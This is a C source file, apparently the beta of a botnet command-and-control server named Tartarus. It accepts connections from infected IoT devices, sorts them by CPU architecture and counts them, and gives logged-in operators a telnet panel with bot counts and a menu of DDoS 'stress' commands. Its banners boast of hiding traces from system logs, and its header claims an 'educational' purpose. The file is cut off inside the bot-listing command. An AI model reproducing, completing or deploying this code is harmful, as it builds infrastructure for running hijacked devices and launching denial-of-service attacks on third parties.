/*
╔═════════════════════════╗
║         Tartarus        ║                                 ╔═════════════════════════╗
║           ---           ║                                 ║     Tartarus : BETA     ║
║          GL3.0          ║                                 ╚═════════════════════════╝
║           666           ║
╚═════════════════════════╝ 

╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ THIS VERSION WILL BE RELEASED TO THE PUBLIC FOR EDUCATIONAL PURPOSES. I AM NOT RESPONSIBLE FOR ANY CYBER ABUSE FROM THE COMMUNITY              ║                 
║ IF YOU ARE USING THIS, PLEASE RESPECT THE AUTHORIZATION AND WORK THE DEVELOPERS HAVE PUT INTO THIS SOURCE / PROJECT                            ║                 
╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╠
                                        ║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║                                                                     
                                        ║  VALID     :  10/01/20                                          ║                                                                    
                                        ║  EXPIRY    :  10/01/23                                          ║                                                                        
                                        ║  --                                                             ║                                                                                
                                        ║  STATE     :  PUBLIC                                            ║                                                                    
                                        ║  OWNERSHIP :  VEXVAIN                                           ║ 
                                        ║  NAME      :  TARTARUS                                          ║                                                                          
                                        ║  --                                                             ║                                                                        
                                        ║  CCR       : XXX-223-389                                        ║                                                                        
                                        ║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║                                                                        
                                        ║  GH-ID     : VEXVAIN.HECK                                       ║                                                                            
                                        ║  --                                                             ║                                                                     
                                        ║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║ 
                                        ║  VSSH      : N/A                                                ║                                                                         
                                        ║  OS_TYPE   : CENT_OS [6] - [7]                                  ║                                                                        
                                        ║  --                                                             ║                                    
                                        ║  BUILD     : BETA [WORK IN PROGRESS]                            ║ 
                                        ║  DESC      : NET-WSS                                            ║        
                                        ║  PRJ-VAS   : 6949-3853-9891                                     ║                                                                          
                                        ║  --        :                                                    ║                                                                        
                                        ║  --        :                                                    ║     
                                        ║  DEV-ALIAS : VEXVAIN                                            ║                                                               
                                        ╚═════════════════════════════════════════════════════════════════╩
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

#include "resolver.h" 

#define MAXFDS 1000000
//////////////////////////
#define purple = "\e[38;5;93m"
#define orange = "\e[38;5;202m"
#define pink = "\e[38;5;201m"


#define Project "Tartarus C2 Source"
#define Developer [":)"]
#define Allies [" Imagine."]
#define tools ["adduser", "domainresolver", "portscanner", "IPGeoLocation"]

struct account 
{
  char user[200]; // username
  char password[200]; // password
  char id [200]; // admin / normal [admin/normal] 
};
static struct account accounts[500];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
        int dup = 0;
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
          if(!clients[ipIndex].connected || ipIndex == infd) continue;
          if(clients[ipIndex].ip == clients[infd].ip) {
            dup = 1;
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "!* Tartarus ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mTartarus\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Tartarus I | IoT Devices: %d | Digital Gangsters: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("tartarus.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("Tartarus_IP.log", "a");
  fprintf(logFile, "\n\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  char *normal = "normal";
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("tartarus.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); 
    ++j;
  }

  char Prompt_1 [500];
  char Prompt_2 [500];
  char Prompt_3 [500];
  char Prompt_4 [500];
  char Prompt_5 [500];  
  char Prompt_6 [500];  
  char Prompt_7 [500];  
  char Prompt_8 [500];  
  char Prompt_9 [500];  
  char Prompt_10 [500];  

  sprintf(Prompt_1,  "                  \e[38;5;201m╔═════════════════════════════╗\r\n");
  sprintf(Prompt_2,  "                  \e[38;5;201m║     \e[38;5;202mWelcome To Tartarus I     \e[38;5;201m║\r\n");
  sprintf(Prompt_3,  "                  \e[38;5;201m║ \e[38;5;202mPlease Enter your Username  \e[38;5;201m║\r\n");
  sprintf(Prompt_4,  "                  \e[38;5;201m║ \e[38;5;202mIn the Login Prompt Below   \e[38;5;201m║\r\n");
  sprintf(Prompt_5,  "                  \e[38;5;201m╚═════════════════════════════╝     \r\n");
  sprintf(Prompt_6,  "              \e[38;5;201m╔═════════════════════════════════════╗\r\n");
  sprintf(Prompt_7,  "              \e[38;5;201m║        \e[38;5;202mThis Source Code is          \e[38;5;201m║\r\n");
  sprintf(Prompt_8,  "              \e[38;5;201m║     \e[38;5;202m Licensed under GPU V3.0        \e[38;5;201m║\r\n");
  sprintf(Prompt_9,  "              \e[38;5;201m║  \e[38;5;202mFOR ALLOWED USE IN 'CYBER-WARFARE' \e[38;5;201m║\r\n");
  sprintf(Prompt_10,  "              \e[38;5;201m╚═════════════════════════════════════╝\r\n");


  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_2, strlen(Prompt_2), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_3, strlen(Prompt_3), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_4, strlen(Prompt_4), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_5, strlen(Prompt_5), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_6, strlen(Prompt_6), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_7, strlen(Prompt_7), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_8, strlen(Prompt_8), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_9, strlen(Prompt_9), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_10, strlen(Prompt_10), MSG_NOSIGNAL) == -1) goto end;

  sprintf(botnet, "\e[38;5;201mUsername:\e[38;5;202m ");
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

    if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\e[38;5;202mLogging In As User: \e[38;5;201m%s\r\n", accounts[find_line].user, buf);
    sprintf(botnet, "\e[38;5;202mPlease Enter Your Password!\r\n");
    sprintf(botnet, "\e[38;5;201mPassword: \e[38;5;202m");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto Tartarus;
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];

        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");

        sprintf(failed_line1, "Login Error!\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "If you run into this issue please contact the owner!\r\n");  // We are Attempting To Display FailedBanner!


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3);
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Tartarus: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char start_1 [90000];
        char start_2 [90000];
        char start_3 [90000];
        char start_4 [90000];
        char start_7 [90000];
        char start_8 [90000];
        char start_9 [90000];
        char start_10 [90000];
        char start_12 [90000];
        char start_13 [90000];
        char Tartarus_2 [90000];
        char Tartarus_3 [90000];
        char Tartarus_4 [90000];
        char Tartarus_5 [90000];
        char Tartarus_6 [90000];
        char Tartarus_7 [90000];
        char Tartarus_8 [90000];
        char Tartarus_9 [90000];
        char Tartarus_10 [9000];
        char Tartarus_11 [9000];
        char Tartarus_12 [9000];
        char Tartarus_13 [9000];
        char Tartarus_14 [9000];
        char Tartarus_15 [9000];
        char Tartarus_16 [9000];
        char Tartarus_17 [9000];
        char Tartarus_18 [9000];
        char Tartarus_19 [9000];
        char Tartarus_20 [9000];
    
        // clear
        sprintf(start_1,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mRemoving All Traces Of LD_Preload..\r\n");
        sprintf(start_2,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mFinished Removing ALL Traces Of LD_Preload!\r\n");
        // clear 
        sprintf(start_3,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mMasking Connection From utmp+wtmp...\r\n");
        sprintf(start_4,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mSucessfully Masked Connection! \r\n");
        // clear
        sprintf(start_7,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mLogging User Information..\r\n");
        sprintf(start_8,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mUser Information Successfully Logged!\r\n");
        // clear
        sprintf(start_9,  "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mWelcome \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", accounts[find_line].user, buf);
        sprintf(start_10, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mYour Access Level Is \e[38;5;93m%s!\r\n", accounts[find_line].id, buf);
        sprintf(start_12, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mLoading Tartarus C2 Session.. \r\n");
        sprintf(start_13, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[90m| \e[38;5;202mTartarus C2 Session Loaded! \r\n");
        //clear
        sprintf(Tartarus_2,    "\e[38;5;201m╔════════════════════════════════════╗\r\n");
        sprintf(Tartarus_3,    "\e[38;5;201m║  \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mMain Menu \e[38;5;201m- \e[38;5;202mWelcome!   \e[38;5;201m║\r\n");
        sprintf(Tartarus_4,    "\e[38;5;201m╠════════════════════════════════════╣\r\n");
        sprintf(Tartarus_5,    "\e[38;5;201m║    \e[38;5;202mWelcome to Project Tartarus I     \e[38;5;201m╠════╗\r\n");
        sprintf(Tartarus_6,    "\e[38;5;201m║  \e[38;5;202mThis source is currently in beta  \e[38;5;201m║    ║       ╔════╗\r\n");
        sprintf(Tartarus_7,    "\e[38;5;201m╚════════════════════════╦═══════════╝    ╚═══════╣ \e[38;5;93m<3 \e[38;5;201m╠══════════╗\r\n");
        sprintf(Tartarus_8,    "                         \e[38;5;201m║ \e[38;5;93mVexvain x Vex \e[38;5;201m╚════╝          \e[38;5;201m║\r\n");
        sprintf(Tartarus_9,    "                         \e[38;5;201m║  \e[38;5;93m:)                \e[38;5;201m║\r\n");
        sprintf(Tartarus_10,    "         \e[38;5;201m╔═══════════════╩══════════════════╗                     \e[38;5;201m║\r\n");
        sprintf(Tartarus_11,    "         \e[38;5;201m║  \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mCommand List \e[38;5;201m- \e[38;5;202mCmDs  \e[38;5;201m║      ╔══════════════╩══════════════════════════╗\r\n");
        sprintf(Tartarus_12,    "         \e[38;5;201m╠══════════════════════════════════╣      ║ \e[38;5;202mOS_Sys\e[38;5;201m: \e[38;5;202mCentOS \e[38;5;201m[\e[38;5;202m6\e[38;5;201m] - [\e[38;5;202m7\e[38;5;201m]                \e[38;5;201m║\r\n");
        sprintf(Tartarus_13,    "         \e[38;5;201m║ \e[38;5;202m.help \e[38;5;201m- \e[38;5;202mFull List of Commands    \e[38;5;201m║      ║ \e[38;5;202mCCR\e[38;5;201m: \e[38;5;202mXXX-223-389                        \e[38;5;201m║\r\n");
        sprintf(Tartarus_14,    "         \e[38;5;201m║ \e[38;5;202m.stress \e[38;5;201m- \e[38;5;202mList of DDoS Commands  \e[38;5;201m╠══════╣ \e[38;5;202mCIPHER\e[38;5;201m: \e[38;5;202mSHA-512 , AES-BYTE , CIPHER-TLS \e[38;5;201m║\r\n");
        sprintf(Tartarus_15,    "         \e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out of the C2     \e[38;5;201m║      ║ \e[38;5;202mSTATE\e[38;5;201m: \e[38;5;202mPRIVATE                          \e[38;5;201m║\r\n");
        sprintf(Tartarus_16,    "         \e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears screen           \e[38;5;201m║      ║ \e[38;5;202mOBJ-TYPE\e[38;5;201m: \e[38;5;202mC2 SOURCE X TELNET LAYER      \e[38;5;201m║\r\n");
        sprintf(Tartarus_17,    "         \e[38;5;201m║ \e[38;5;202m.tools \e[38;5;201m- \e[38;5;202mList of available tools \e[38;5;201m║      ║ \e[38;5;202mLSC\e[38;5;201m: \e[38;5;202mGL3.0                              \e[38;5;201m║\r\n");
        sprintf(Tartarus_18,    "         \e[38;5;201m╚══════════════════════════════════╝      ╚═════════════════════════════════════════╝\r\n");
        sprintf(Tartarus_19,   " \r\n");
        sprintf(Tartarus_20,   " \r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, start_1, strlen(start_1), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_2, strlen(start_2), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_3, strlen(start_3), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_4, strlen(start_4), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_7, strlen(start_7), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_8, strlen(start_8), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_9, strlen(start_9), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
        if(send(thefd, start_10, strlen(start_10), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if(send(thefd, start_12, strlen(start_12), MSG_NOSIGNAL) == -1) goto end;
        sleep (2);
        if(send(thefd, start_13, strlen(start_13), MSG_NOSIGNAL) == -1) goto end;
        sleep (5);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_2, strlen(Tartarus_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_3, strlen(Tartarus_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_4, strlen(Tartarus_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_5, strlen(Tartarus_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_6, strlen(Tartarus_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_7, strlen(Tartarus_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_8, strlen(Tartarus_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_9, strlen(Tartarus_9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_10, strlen(Tartarus_10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_11, strlen(Tartarus_11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_12, strlen(Tartarus_12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_13, strlen(Tartarus_13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_14, strlen(Tartarus_14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_15, strlen(Tartarus_15), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_16, strlen(Tartarus_16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_17, strlen(Tartarus_17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_18, strlen(Tartarus_18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_19, strlen(Tartarus_19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_20, strlen(Tartarus_20), MSG_NOSIGNAL) == -1) goto end;
        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0)
      {
      if (strstr(buf, ".bots")) 
      {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
      char total[128];
      char mips[128];
      char sh4[128];
      char arm[128];
      char ppc[128];
      char x86[128];
      char spc[128];
      char bot_1 [5000];
      char bot_2 [5000];
      char bot_3 [5000];
      char bot_4 [5000];

      sprintf(bot_1,    "\e[38;5;201m╔════════════════════════════════════════════╗\r\n");
